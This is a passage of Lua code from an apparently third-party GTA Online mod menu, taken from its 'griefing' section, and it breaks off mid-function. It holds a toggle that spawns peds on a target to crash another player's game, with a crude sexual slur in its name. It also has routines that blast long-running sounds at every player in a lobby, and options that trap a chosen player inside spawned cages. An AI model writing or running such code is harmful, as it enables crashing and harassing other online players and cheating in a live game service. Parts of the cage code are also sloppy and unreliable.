                    bk[U] = entities.create_ped(28, pedhash, bf, bj)
                    util.yield(25)
                end
                    util.toast("Done sending")
                util.yield(3000)
                    util.toast("Cleaning up")
                for U = 1, 150 do
                    entities.delete_by_handle(bk[U])
                    util.yield(10)
                end
                util.yield(10)
                if not players.exists(pid) then
                    util.toast(a0[math.random(1, 13)], TOAST_ABOVE_MAP)
                    util.toast("Player left")
                end
                util.yield(10)
                aU = false
            end
            if aU then
            end
        end)

   menu.toggle_loop(griefing, "Village People 360 Wade Raper", {"waderape"}, "Send's a few wades (only works on others, not yourself) Might crash a legit player.", function(on_toggle)
            if pid ~= players.user() and players.exists(pid) then
                pedhash = 0xD266D9D6
                while not STREAMING.HAS_MODEL_LOADED(pedhash) do
                    STREAMING.REQUEST_MODEL(pedhash)
                    util.yield(10)
                end
                notification("Village People 360 Crash has been sent to " .. PLAYER.GET_PLAYER_NAME(pid), true, true, colors.red)
                local bh = PLAYER.GET_PLAYER_PED(pid)
                local bi = ENTITY.GET_ENTITY_COORDS(bh, true)
                local bj = CAM.GET_FINAL_RENDERED_CAM_ROT(2).z
                local bk = {}
                local bf = bi
                bf.x = bf.x
                bf.y = bf.y
                bf.z = bf.z
                for U = 1, 10 do
                    bk[U] = entities.create_ped(28, pedhash, bf, bj)
                    util.yield(100)
                end
                    util.toast("Done sending")
                util.yield(10)
                    util.toast("Cleaning up")
                for U = 1, 10 do
                    entities.delete_by_handle(bk[U])
                    util.yield(0)
                end
                util.yield(0)
                if not players.exists(pid) then
                    util.toast(a0[math.random(1, 13)], TOAST_ABOVE_MAP)
                    util.toast("Player left")
                end
                util.yield(0)
                aU = false
            end
            if aU then
            end
        end)

	cage_options = menu.list(griefing, "Cage Options", {}, "")

	menu.divider(cage_options, "Cage Options")



-- Yoinked From MoistScript, hope moist won't mind :)
SoundAnnoy = {
    { "All", "SHORT_PLAYER_SWITCH_SOUND_SET" },
    { "TENNIS_POINT_WON", "HUD_AWARDS" },
    {"Air_Defenses_Disabled", "DLC_sum20_Business_Battle_AC_Sounds"},
    {"Air_Defences_Activated", "DLC_sum20_Business_Battle_AC_Sounds"},
    {"TIME_LAPSE_MASTER", "0"},
    {"Fire", "DLC_BTL_Terrobyte_Turret_Sounds"},
    {"TIMER", "HUD_FRONTEND_DEFAULT_SOUNDSET"},
    {"Timer_10s", "DLC_HALLOWEEN_FVJ_Sounds"},
    {"TIMER_STOP", "HUD_MINI_GAME_SOUNDSET"},
    {"5s_To_Event_Start_Countdown", "GTAO_FM_Events_Soundset"},
    {"10s", "MP_MISSION_COUNTDOWN_SOUNDSET"},
    {"5s", "MP_MISSION_COUNTDOWN_SOUNDSET"},
    {"5_Second_Timer", "DLC_HEISTS_GENERAL_FRONTEND_SOUNDS"},
    {"5_SEC_WARNING", "HUD_MINI_GAME_SOUNDSET"},
    {"3_2_1_NON_RACE", "HUD_MINI_GAME_SOUNDSET"},
    {"3_2_1", "HUD_MINI_GAME_SOUNDSET"},
    {"Arming_Countdown", "GTAO_Speed_Convoy_Soundset"},
    {"Bomb_Disarmed", "GTAO_Speed_Convoy_Soundset"},
    {"Boss_Blipped", "GTAO_Magnate_Hunt_Boss_SoundSet"},
    {"Boss_Message_Orange", "GTAO_Boss_Goons_FM_Soundset"},
    {"1st_Person_Transition", "PLAYER_SWITCH_CUSTOM_SOUNDSET"},
    {"Apt_Style_Purchase", "DLC_APT_Apartment_SoundSet"},
    {"ARM_WRESTLING_WHOOSH_MASTER", "0"},
    {"ASSASSINATIONS_HOTEL_TIMER_COUNTDOWN", "ASSASSINATION_MULTI"},
    {"ATM_WINDOW", "HUD_FRONTEND_DEFAULT_SOUNDSET"},
    {"BASE_JUMP_PASSED", "HUD_AWARDS"},
    {"Bed", "WastedSounds"},
    {"Beep_Green", "DLC_HEIST_HACKING_SNAKE_SOUNDS"},
    {"Beep_Red", "DLC_HEIST_HACKING_SNAKE_SOUNDS"},
    {"Blade_Appear", "APT_BvS_Soundset"},
    {"BOATS_PLANES_HELIS_BOOM", "MP_LOBBY_SOUNDS"},
    {"Breaker_01", "DLC_HALLOWEEN_FVJ_Sounds"},
    {"Breaker_02", "DLC_HALLOWEEN_FVJ_Sounds"},
    {"Bus_Schedule_Pickup", "DLC_PRISON_BREAK_HEIST_SOUNDS"},
    {"CABLE_SNAPS", "CONSTRUCTION_ACCIDENT_1_SOUNDS"},
    {"CAM_PAN_DARTS", "HUD_MINI_GAME_SOUNDSET"},
    {"Camera_Shoot", "Phone_Soundset_Franklin"},
    {"CANCEL", "HUD_FREEMODE_SOUNDSET"},
    {"CAR_BIKE_WHOOSH", "MP_LOBBY_SOUNDS"},
    {"CHALLENGE_UNLOCKED", "HUD_AWARDS"},
    {"CHECKPOINT_AHEAD", "HUD_MINI_GAME_SOUNDSET"},
    {"CHECKPOINT_BEHIND", "HUD_MINI_GAME_SOUNDSET"},
 --   {"Checkpoint_Cash_Hit", "GTAO_FM_Events_Soundset"},
    {"Checkpoint_Hit", "GTAO_FM_Events_Soundset"},
    {"CHECKPOINT_MISSED", "HUD_MINI_GAME_SOUNDSET"},
    {"CHECKPOINT_NORMAL", "HUD_MINI_GAME_SOUNDSET"},
    {"CHECKPOINT_PERFECT", "HUD_MINI_GAME_SOUNDSET"},
    {"Checkpoint_Teammate", "GTAO_Shepherd_Sounds"},
    {"CHECKPOINT_UNDER_THE_BRIDGE", "HUD_MINI_GAME_SOUNDSET"},
    {"Click", "DLC_HEIST_HACKING_SNAKE_SOUNDS"},
    {"CLICK_BACK", "WEB_NAVIGATION_SOUNDS_PHONE"},
    {"Click_Fail", "WEB_NAVIGATION_SOUNDS_PHONE"},
    {"Click_Special", "WEB_NAVIGATION_SOUNDS_PHONE"},
    {"CLOSED", "MP_PROPERTIES_ELEVATOR_DOORS"},
    {"CONFIRM_BEEP", "HUD_MINI_GAME_SOUNDSET"},
    {"CONTINUE", "HUD_FRONTEND_DEFAULT_SOUNDSET"},
    {"Continue_Appears", "DLC_HEIST_PLANNING_BOARD_SOUNDS"},
    {"Crash", "DLC_HEIST_HACKING_SNAKE_SOUNDS"},
    {"Criminal_Damage_High_Value", "GTAO_FM_Events_Soundset"},
    {"Criminal_Damage_Kill_Player", "GTAO_FM_Events_Soundset"},
    {"Criminal_Damage_Low_Value", "GTAO_FM_Events_Soundset"},
    {"Cycle_Item", "DLC_Dmod_Prop_Editor_Sounds"},
    {"DELETE", "HUD_DEATHMATCH_SOUNDSET"},
    {"Delete_Placed_Prop", "DLC_Dmod_Prop_Editor_Sounds"},
    {"Deliver_Pick_Up", "HUD_FRONTEND_MP_COLLECTABLE_SOUNDS"},
    {"DiggerRevOneShot", "BulldozerDefault"},
    {"Door_Open", "DOCKS_HEIST_FINALE_2B_SOUNDS"},
    {"Drill_Pin_Break", "DLC_HEIST_FLEECA_SOUNDSET"},
    {"Dropped", "HUD_FRONTEND_MP_COLLECTABLE_SOUNDS"},
    {"EDIT", "HUD_DEATHMATCH_SOUNDSET"},
    {"Start_Squelch", "CB_RADIO_SFX"},
    {"End_Squelch", "CB_RADIO_SFX"},
    {"Enemy_Capture_Start", "GTAO_Magnate_Yacht_Attack_Soundset"},
    {"Enemy_Deliver", "HUD_FRONTEND_MP_COLLECTABLE_SOUNDS"},
    {"Enemy_Pick_Up", "HUD_FRONTEND_MP_COLLECTABLE_SOUNDS"},
    {"Enter_1st", "GTAO_FM_Events_Soundset"},
    {"Enter_Area", "DLC_Lowrider_Relay_Race_Sounds"},
    {"Enter_Capture_Zone", "DLC_Apartments_Drop_Zone_Sounds"},
    {"ERROR", "HUD_AMMO_SHOP_SOUNDSET"},
    {"Event_Message_Purple", "GTAO_FM_Events_Soundset"},
    {"Event_Start_Text", "GTAO_FM_Events_Soundset"},
    {"EXIT", "HUD_FRONTEND_DEFAULT_SOUNDSET"},
    {"Exit_Capture_Zone", "DLC_Apartments_Drop_Zone_Sounds"},
    {"Failure", "DLC_HEIST_HACKING_SNAKE_SOUNDS"},
    {"Falling_Crates", "EXILE_1"},
    {"Faster_Bar_Full", "RESPAWN_ONLINE_SOUNDSET"},
    {"Faster_Click", "RESPAWN_ONLINE_SOUNDSET"},
    {"FestiveGift", "Feed_Message_Sounds"},
    {"FIRST_PLACE", "HUD_MINI_GAME_SOUNDSET"},
    {"FLIGHT_SCHOOL_LESSON_PASSED", "HUD_AWARDS"},
    {"FLYING_STREAM_END_INSTANT", "FAMILY_5_SOUNDS"},
    {"FocusIn", "HintCamSounds"},
    {"FocusOut", "HintCamSounds"},
    {"Friend_Deliver", "HUD_FRONTEND_MP_COLLECTABLE_SOUNDS"},
    {"Friend_Pick_Up", "HUD_FRONTEND_MP_COLLECTABLE_SOUNDS"},
    {"GO", "HUD_MINI_GAME_SOUNDSET"},
    {"Goal", "DLC_HEIST_HACKING_SNAKE_SOUNDS"},
    {"GOLF_BIRDIE", "HUD_AWARDS"},
    {"GOLF_EAGLE", "HUD_AWARDS"},
    {"GOLF_HUD_HOLE_IN_ONE_MASTER", "0"},
    {"GOLF_HUD_SCORECARD_MASTER", "0"},
    {"GOLF_NEW_RECORD", "HUD_AWARDS"},
    {"Goon_Paid_Small", "GTAO_Boss_Goons_FM_Soundset"},
    {"Grab_Parachute", "BASEJUMPS_SOUNDS"},
    {"Hack_Failed", "DLC_HEIST_BIOLAB_PREP_HACKING_SOUNDS"},
    {"Hack_Success", "DLC_HEIST_BIOLAB_PREP_HACKING_SOUNDS"},
    {"HACKING_CLICK", "0"},
    {"HACKING_CLICK_BAD", "0"},
    {"HACKING_CLICK_GOOD", "0"},
    {"HACKING_MOVE_CURSOR", "0"},
    {"Hang_Up", "Phone_SoundSet_Michael"},
    {"HIGHLIGHT", "HUD_FRONTEND_DEFAULT_SOUNDSET"},
    {"Highlight_Accept", "DLC_HEIST_PLANNING_BOARD_SOUNDS"},
    {"Highlight_Cancel", "DLC_HEIST_PLANNING_BOARD_SOUNDS"},
    {"Highlight_Error", "DLC_HEIST_PLANNING_BOARD_SOUNDS"},
    {"Highlight_Move", "DLC_HEIST_PLANNING_BOARD_SOUNDS"},
    {"HIGHLIGHT_NAV_UP_DOWN", "HUD_FRONTEND_DEFAULT_SOUNDSET"},
    {"Hit", "RESPAWN_ONLINE_SOUNDSET"},
    {"Hit_1", "LONG_PLAYER_SWITCH_SOUNDS"},
    {"Hit_In", "PLAYER_SWITCH_CUSTOM_SOUNDSET"},
    {"Hit_Out", "PLAYER_SWITCH_CUSTOM_SOUNDSET"},
    {"HORDE_COOL_DOWN_TIMER", "HUD_FRONTEND_DEFAULT_SOUNDSET"},
    {"HUD_FREEMODE_CANCEL_MASTER", "0"},
    {"Kill_List_Counter", "GTAO_FM_Events_Soundset"},
    {"LEADERBOARD", "HUD_MINI_GAME_SOUNDSET"},
    {"Lights_On", "GTAO_MUGSHOT_ROOM_SOUNDS"},
    {"LIMIT", "DLC_APT_YACHT_DOOR_SOUNDS"},
    {"Load_Scene", "DLC_Dmod_Prop_Editor_Sounds"},
    {"LOCAL_PLYR_CASH_COUNTER_COMPLETE", "DLC_HEISTS_GENERAL_FRONTEND_SOUNDS"},
    {"LOCAL_PLYR_CASH_COUNTER_INCREASE", "DLC_HEISTS_GENERAL_FRONTEND_SOUNDS"},
    {"LOOSE_MATCH", "HUD_MINI_GAME_SOUNDSET"},
    {"Lose_1st", "GTAO_FM_Events_Soundset"},
    {"LOSER", "HUD_AWARDS"},
    {"Map_Roll_Down", "DLC_HEIST_PLANNING_BOARD_SOUNDS"},
    {"Map_Roll_Up", "DLC_HEIST_PLANNING_BOARD_SOUNDS"},
    {"MARKER_ERASE", "HEIST_BULLETIN_BOARD_SOUNDSET"},
    {"MARTIN1_DISTANT_TRAIN_HORNS_MASTER", "0"},
    {"MEDAL_BRONZE", "HUD_AWARDS"},
    {"MEDAL_GOLD", "HUD_AWARDS"},
    {"MEDAL_SILVER", "HUD_AWARDS"},
    {"MEDAL_UP", "HUD_MINI_GAME_SOUNDSET"},
    {"Menu_Accept", "Phone_SoundSet_Default"},
    {"Mission_Pass_Notify", "DLC_HEISTS_GENERAL_FRONTEND_SOUNDS"},
    {"MP_5_SECOND_TIMER", "HUD_FRONTEND_DEFAULT_SOUNDSET"},
    {"MP_AWARD", "HUD_FRONTEND_DEFAULT_SOUNDSET"},
    {"MP_Flash", "WastedSounds"},
    {"MP_IDLE_KICK", "HUD_FRONTEND_DEFAULT_SOUNDSET"},
    {"MP_IDLE_TIMER", "HUD_FRONTEND_DEFAULT_SOUNDSET"},
    {"MP_Impact", "WastedSounds"},
    {"MP_RANK_UP", "HUD_FRONTEND_DEFAULT_SOUNDSET"},
    {"MP_WAVE_COMPLETE", "HUD_FRONTEND_DEFAULT_SOUNDSET"},
    {"NAV", "HUD_AMMO_SHOP_SOUNDSET"},
    {"Nav_Arrow_Ahead", "DLC_HEISTS_GENERAL_FRONTEND_SOUNDS"},
    {"Nav_Arrow_Behind", "DLC_HEISTS_GENERAL_FRONTEND_SOUNDS"},
    {"Nav_Arrow_Left", "DLC_HEISTS_GENERAL_FRONTEND_SOUNDS"},
    {"Nav_Arrow_Right", "DLC_HEISTS_GENERAL_FRONTEND_SOUNDS"},
    {"NAV_LEFT_RIGHT", "HUD_FREEMODE_SOUNDSET"},
    {"NAV_UP_DOWN", "HUD_FREEMODE_SOUNDSET"},
    {"Near_Miss_Counter_Reset", "GTAO_FM_Events_Soundset"},
    {"NO", "HUD_FRONTEND_DEFAULT_SOUNDSET"},
    --{"Object_Collect_Player", "GTAO_FM_Events_Soundset"},
    {"Object_Dropped_Remote", "GTAO_FM_Events_Soundset"},
    {"Off_High", "MP_RADIO_SFX"},
    {"OK", "HUD_FRONTEND_DEFAULT_SOUNDSET"},
    {"ON", "NOIR_FILTER_SOUNDS"},
    {"On_Call_Player_Join", "DLC_HEISTS_GENERAL_FRONTEND_SOUNDS"},
    --{"Oneshot_Final", "MP_MISSION_COUNTDOWN_SOUNDSET"},
    {"OOB_Cancel", "GTAO_FM_Events_Soundset"},
    {"OOB_Start", "GTAO_FM_Events_Soundset"},
    {"OPEN_WINDOW", "LESTER1A_SOUNDS"},
    {"OPENED", "MP_PROPERTIES_ELEVATOR_DOORS"},
    {"OTHER_TEXT", "HUD_AWARDS"},
    {"Out_Of_Area", "DLC_Lowrider_Relay_Race_Sounds"},
    {"Out_Of_Bounds_Timer", "DLC_HEISTS_GENERAL_FRONTEND_SOUNDS"},
    {"Paper_Shuffle", "DLC_HEIST_PLANNING_BOARD_SOUNDS"},
    {"Parcel_Vehicle_Lost", "GTAO_FM_Events_Soundset"},
    {"Payment_Non_Player", "DLC_HEISTS_GENERIC_SOUNDS"},
    {"Payment_Player", "DLC_HEISTS_GENERIC_SOUNDS"},
    {"Pen_Tick", "DLC_HEIST_PLANNING_BOARD_SOUNDS"},
    {"PERSON_SCROLL", "HEIST_BULLETIN_BOARD_SOUNDSET"},
    {"PERSON_SELECT", "HEIST_BULLETIN_BOARD_SOUNDSET"},
    {"Phone_Generic_Key_02", "HUD_MINIGAME_SOUNDSET"},
    {"PICK_UP", "HUD_FRONTEND_DEFAULT_SOUNDSET"},
    {"Pin_Bad", "DLC_HEIST_BIOLAB_PREP_HACKING_SOUNDS"},
    {"PIN_BUTTON", "ATM_SOUNDS"},
    {"Pin_Centred", "DLC_HEIST_BIOLAB_PREP_HACKING_SOUNDS"},
    {"Pin_Good", "DLC_HEIST_BIOLAB_PREP_HACKING_SOUNDS"},
    {"PIPES_LAND", "CONSTRUCTION_ACCIDENT_1_SOUNDS"},
    {"Place_Prop_Fail", "DLC_Dmod_Prop_Editor_Sounds"},
    {"Place_Prop_Success", "DLC_Dmod_Prop_Editor_Sounds"},
    {"Player_Collect", "DLC_PILOT_MP_HUD_SOUNDS"},
    {"Player_Enter_Line", "GTAO_FM_Cross_The_Line_Soundset"},
    {"Player_Exit_Line", "GTAO_FM_Cross_The_Line_Soundset"},
    {"Power_Down", "DLC_HEIST_HACKING_SNAKE_SOUNDS"},
    {"Pre_Screen_Stinger", "DLC_HEISTS_FAILED_SCREEN_SOUNDS"},
    {"PS2A_MONEY_LOST", "PALETO_SCORE_2A_BANK_SS"},
    {"PURCHASE", "HUD_LIQUOR_STORE_SOUNDSET"},
    {"Put_Away", "Phone_SoundSet_Michael"},
    {"QUIT", "HUD_FRONTEND_DEFAULT_SOUNDSET"},
    {"QUIT_WHOOSH", "HUD_MINI_GAME_SOUNDSET"},
    {"RACE_PLACED", "HUD_AWARDS"},
    {"RAMP_DOWN", "TRUCK_RAMP_DOWN"},
    {"RAMP_UP", "TRUCK_RAMP_DOWN"},
    {"RANK_UP", "HUD_AWARDS"},
    {"REMOTE_PLYR_CASH_COUNTER_COMPLETE", "DLC_HEISTS_GENERAL_FRONTEND_SOUNDS"},
    {"REMOTE_PLYR_CASH_COUNTER_INCREASE", "DLC_HEISTS_GENERAL_FRONTEND_SOUNDS"},
    {"Reset_Prop_Position", "DLC_Dmod_Prop_Editor_Sounds"},
    {"RESTART", "HUD_FRONTEND_DEFAULT_SOUNDSET"},
    {"RETRY", "HUD_FRONTEND_DEFAULT_SOUNDSET"},
    {"ROBBERY_MONEY_TOTAL", "HUD_FRONTEND_CUSTOM_SOUNDSET"},
    {"ROPE_CUT", "ROPE_CUT_SOUNDSET"},
    --{"ROUND_ENDING_STINGER_CUSTOM", "CELEBRATION_SOUNDSET"},
    {"Save_Scene", "DLC_Dmod_Prop_Editor_Sounds"},
    {"SCOPE_UI_MASTER", "0"},
    {"ScreenFlash", "WastedSounds"},
    {"SCREEN_SWIPE", "CELEBRATION_SWIPE"},
    {"SELECT", "HUD_FREEMODE_SOUNDSET"},
    {"Select_Placed_Prop", "DLC_Dmod_Prop_Editor_Sounds"},
    {"Shard_Disappear", "GTAO_FM_Events_Soundset"},
    {"SHOOTING_RANGE_ROUND_OVER", "HUD_AWARDS"},
    {"Short_Transition_In", "PLAYER_SWITCH_CUSTOM_SOUNDSET"},
    {"Short_Transition_Out", "PLAYER_SWITCH_CUSTOM_SOUNDSET"},
    {"SKIP", "HUD_FRONTEND_DEFAULT_SOUNDSET"},
    {"Start", "DLC_HEIST_HACKING_SNAKE_SOUNDS"},
    {"STUN_COLLECT", "MINUTE_MAN_01_SOUNDSET"},
    {"Success", "DLC_HEIST_HACKING_SNAKE_SOUNDS"},
    {"Swap_Sides", "DLC_HALLOWEEN_FVJ_Sounds"},
    {"SWING_SHUT", "GTAO_APT_DOOR_DOWNSTAIRS_GLASS_SOUNDS"},
    {"Tattooing_Oneshot", "TATTOOIST_SOUNDS"},
    {"Tattooing_Oneshot_Remove", "TATTOOIST_SOUNDS"},
    {"Team_Capture_Start", "GTAO_Magnate_Yacht_Attack_Soundset"},
    {"TENNIS_MATCH_POINT", "HUD_AWARDS"},
    {"TENNIS_POINT_WON", "HUD_AWARDS"},
    {"TextHit", "WastedSounds"},
    {"TOGGLE_ON", "HUD_FRONTEND_DEFAULT_SOUNDSET"},
    {"Turn", "DLC_HEIST_HACKING_SNAKE_SOUNDS"},
    {"UNDER_THE_BRIDGE", "HUD_AWARDS"},
    {"WAYPOINT_SET", "HUD_FRONTEND_DEFAULT_SOUNDSET"},
    {"WEAPON_ATTACHMENT_EQUIP", "HUD_AMMO_SHOP_SOUNDSET"},
    {"WEAPON_ATTACHMENT_UNEQUIP", "HUD_AMMO_SHOP_SOUNDSET"},
    {"WEAPON_PURCHASE", "HUD_AMMO_SHOP_SOUNDSET"},
    {"WEAPON_SELECT_ARMOR", "HUD_AMMO_SHOP_SOUNDSET"},
    {"Whoosh_1s_L_to_R", "MP_LOBBY_SOUNDS"},
    {"Whoosh_1s_R_to_L", "MP_LOBBY_SOUNDS"},
    {"WIN", "HUD_AWARDS"},
    {"Zone_Enemy_Capture", "DLC_Apartments_Drop_Zone_Sounds"},
    {"Zone_Neutral", "DLC_Apartments_Drop_Zone_Sounds"},
    {"Zone_Team_Capture", "DLC_Apartments_Drop_Zone_Sounds"},
    {"Zoom_In", "DLC_HEIST_PLANNING_BOARD_SOUNDS"},
    {"Zoom_Left", "DLC_HEIST_PLANNING_BOARD_SOUNDS"},
    {"Zoom_Out", "DLC_HEIST_PLANNING_BOARD_SOUNDS"},
    {"Zoom_Right", "DLC_HEIST_PLANNING_BOARD_SOUNDS"},
    {"Checkpoint_Finish_Winner", "DLC_Tuner_Car_Meet_Test_Area_Events_Sounds"},
    {"Checkpoint", "DLC_Tuner_Car_Meet_Test_Area_Events_Sounds"},
}

local getPlayerPed = PLAYER.GET_PLAYER_PED
local getEntityCoords = ENTITY.GET_ENTITY_COORDS


local function AudioAnnoyance(Ker_SND, Ker_AUD)
    for i=0, 31, 1 do
        Ker_pped = getPlayerPed(i)
        Ker_pos = getEntityCoords(Ker_pped)
        AUDIO.PLAY_SOUND_FROM_COORD(-1, Ker_SND, Ker_pos.x, Ker_pos.y, Ker_pos.z, Ker_AUD, true, 999999999, true)
    end
end

local function playerActionsSetup(pid)
    local playerMain = menu.list(griefing, "Sounds", {}, "")
    local playerPos = getEntityCoords(getPlayerPed(pid))
    local playerPed = getPlayerPed(pid)
    for i = 1, #SoundAnnoy do
        menu.action(playerMain, SoundAnnoy[i][1], {"kSounds_" .. SoundAnnoy[i][1]}, "", function()
            local snd, aud
            snd = tostring(SoundAnnoy[i][1])
            aud = tostring(SoundAnnoy[i][2])
           -- AUDIO.PLAY_SOUND_FROM_COORD(-1, snd, playerPos.x, playerPos.y, playerPos.z, aud, true, 50, true)
           AUDIO.PLAY_SOUND_FROM_ENTITY(-1, snd, playerPed, aud, true, true)
        end)
        menu.toggle_loop(playerMain, SoundAnnoy[i][1], {}, "", function ()
            local snd, aud
            snd = tostring(SoundAnnoy[i][1])
            aud = tostring(SoundAnnoy[i][2])
            --AUDIO.PLAY_SOUND_FROM_COORD(-1, snd, playerPos.x, playerPos.y, playerPos.z, aud, true, 50, true)
            AUDIO.PLAY_SOUND_FROM_ENTITY(-1, snd, playerPed, aud, true, true)
        end)
    end
end

local soundsList = menu.list(griefing, "Play Sounds throughout the map.", {"Ksounds", "soundslist", "soundannoy"}, "A list of sounds that can be played throughout the entire freemode lobby. Sounds provided by Moist through his MoistScript.")

menu.action(soundsList, "Stop all sounds", {"kstopall", "kstopallsounds"}, "Stops all sounds. Credit to [hungwy] on the Stand discord for telling me the method.", function ()
    for i=0,99 do
       AUDIO.STOP_SOUND(i)
       AUDIO.RELEASE_SOUND_ID(i)
       util.yield() 
    end
end)
for i = 1, #SoundAnnoy do
    menu.action(soundsList, SoundAnnoy[i][1], {}, "", function()
        local snd, aud
        snd = tostring(SoundAnnoy[i][1])
        aud = tostring(SoundAnnoy[i][2])
        AudioAnnoyance(snd, aud)
    end)


    menu.toggle_loop(soundsList, SoundAnnoy[i][1], {}, "", function ()
        local snd, aud
        snd = tostring(SoundAnnoy[i][1])
        aud = tostring(SoundAnnoy[i][2])
        AudioAnnoyance(snd, aud)
    end)
end


	menu.action(cage_options, "Simple", {"cage"}, "", function()
		local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
		local pos = ENTITY.GET_ENTITY_COORDS(player_ped) 
		if PED.IS_PED_IN_ANY_VEHICLE(player_ped, false) then
			menu.trigger_commands("freeze"..PLAYER.GET_PLAYER_NAME(pid).." on")
			util.yield(300)
			if PED.IS_PED_IN_ANY_VEHICLE(player_ped, false) then
				notification("Failed to kick player out of the vehicle", colors.red)
				menu.trigger_commands("freeze"..PLAYER.GET_PLAYER_NAME(pid).." off")
				return
			end
			menu.trigger_commands("freeze"..PLAYER.GET_PLAYER_NAME(pid).." off")
			pos =  ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)) --if not it could place the cage at the wrong position
		end
		cage_player(pos)
	end)

---------------------------------------------------------------------------------------------------------------------------------
	
	menu.action(cage_options, "First Job", {"foodtruckcage"}, "", function()
		local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
		local hash = 4022605402
		STREAMING.REQUEST_MODEL(hash)

		while not STREAMING.HAS_MODEL_LOADED(hash) do		
			util.yield()
		end
		local cage_object = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y, pos.z - 1, true, true, false)
		cages[#cages + 1] = cage_object
		util.yield(15)

		--local rot  = ENTITY.GET_ENTITY_ROTATION(cage_object)
		--rot.y = 90
		--ENTITY.SET_ENTITY_ROTATION(cage_object, rot.x,rot.y,rot.z,1,true)
		STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(cage_object)
	end)

---------------------------------------------------------------------------------------------------------------------------------
	
menu.action(cage_options, "Married Simulator", {"doghousecage"}, "", function()
	local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
	local hash = -1782242710
	STREAMING.REQUEST_MODEL(hash)
	
	while not STREAMING.HAS_MODEL_LOADED(hash) do		
		util.yield()
	end
	local cage_object = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y, pos.z, true, true, false)
	cages[#cages + 1] = cage_object
	util.yield(15)

	--local rot  = ENTITY.GET_ENTITY_ROTATION(cage_object)
	--rot.y = 90
	--ENTITY.SET_ENTITY_ROTATION(cage_object, rot.x,rot.y,rot.z,1,true)
	STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(cage_object)
end)

---------------------------------------------------------------------------------------------------------------------------------

	
menu.action(cage_options, "Christmas Time", {"jollycage"}, "", function()
	local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
	local hash = 238789712
	STREAMING.REQUEST_MODEL(hash)
	
	while not STREAMING.HAS_MODEL_LOADED(hash) do		
		util.yield()
	end
	local cage_object = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y, pos.z - 1, true, true, false)
	cages[#cages + 1] = cage_object
	util.yield(15)

	--local rot  = ENTITY.GET_ENTITY_ROTATION(cage_object)
	--rot.y = 90
	--ENTITY.SET_ENTITY_ROTATION(cage_object, rot.x,rot.y,rot.z,1,true)
	STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(cage_object)
end)

---------------------------------------------------------------------------------------------------------------------------------

	
menu.action(cage_options, "Christmas Time v2", {"jollycage2"}, "", function()
	local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
	local hash = util.joaat("ch_prop_tree_02a")
	STREAMING.REQUEST_MODEL(hash)

	while not STREAMING.HAS_MODEL_LOADED(hash) do		
		util.yield()
	end
	local cage_object = OBJECT.CREATE_OBJECT(hash, pos.x - .75, pos.y, pos.z - .5, true, true, false) -- front
	local cage_object2 = OBJECT.CREATE_OBJECT(hash, pos.x + .75, pos.y, pos.z - .5, true, true, false) -- back
	local cage_object3 = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y + .75, pos.z - .5, true, true, false) -- left
	local cage_object4 = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y - .75, pos.z - .5, true, true, false) -- right
	local cage_object5 = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y, pos.z + .5, true, true, false) -- above
	cages[#cages + 1] = cage_object
	cages[#cages + 1] = cage_object
	util.yield(15)
	--local rot  = ENTITY.GET_ENTITY_ROTATION(cage_object)
	--rot.y = 90
	--ENTITY.SET_ENTITY_ROTATION(cage_object, rot.x,rot.y,rot.z,1,true)
	STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(cage_object)
end)





---------------------------------------------------------------------------------------------------------------------------------

	
menu.action(cage_options, "Christmas Time v3", {"jollycage3"}, "", function()
	local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
	local hash = util.joaat("ch_prop_tree_03a")
	STREAMING.REQUEST_MODEL(hash)

	while not STREAMING.HAS_MODEL_LOADED(hash) do		
		util.yield()
	end
	local cage_object = OBJECT.CREATE_OBJECT(hash, pos.x - .75, pos.y, pos.z - .5, true, true, false) -- front
	local cage_object2 = OBJECT.CREATE_OBJECT(hash, pos.x + .75, pos.y, pos.z - .5, true, true, false) -- back
	local cage_object3 = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y + .75, pos.z - .5, true, true, false) -- left
	local cage_object4 = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y - .75, pos.z - .5, true, true, false) -- right
	local cage_object5 = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y, pos.z + .5, true, true, false) -- above
	cages[#cages + 1] = cage_object
	cages[#cages + 1] = cage_object
	util.yield()
	--local rot  = ENTITY.GET_ENTITY_ROTATION(cage_object)
	--rot.y = 90
	--ENTITY.SET_ENTITY_ROTATION(cage_object, rot.x,rot.y,rot.z,1,true)
	STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(cage_object)
end)





---------------------------------------------------------------------------------------------------------------------------------

	
menu.action(cage_options, "'Safe' Space", {"safecage"}, "", function()
	local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
	local hash = 1089807209
	STREAMING.REQUEST_MODEL(hash)

	while not STREAMING.HAS_MODEL_LOADED(hash) do		
		util.yield()
	end
	local cage_object = OBJECT.CREATE_OBJECT(hash, pos.x - 1, pos.y, pos.z - .5, true, true, false) -- front
	local cage_object2 = OBJECT.CREATE_OBJECT(hash, pos.x + 1, pos.y, pos.z - .5, true, true, false) -- back
	local cage_object3 = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y + 1, pos.z - .5, true, true, false) -- left
	local cage_object4 = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y - 1, pos.z - .5, true, true, false) -- right
